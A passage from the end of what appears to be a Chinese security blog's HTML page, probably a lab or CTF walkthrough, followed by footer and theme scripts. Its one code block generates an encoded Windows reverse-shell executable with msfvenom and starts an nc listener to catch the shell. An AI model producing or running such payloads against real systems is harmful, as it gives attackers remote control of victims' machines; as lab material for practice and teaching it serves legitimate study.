+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="variable">$lhost</span> LPORT=<span class="variable">$lport</span> -e x86/shikata_ga_nai -f exe -o reverse.exe</span><br><span class="line">nc -lnvp <span class="variable">$lport</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/07/03/iNtiGriTi%20challenge/2023-1-26/">iNtiGriTi CHALLENGES 2023/1/26</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/07/03/%E9%9D%B6%E6%9C%BA/THM_Looking%20Glasses/">Looking Glass</a></div></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">@anonymity</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.19.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
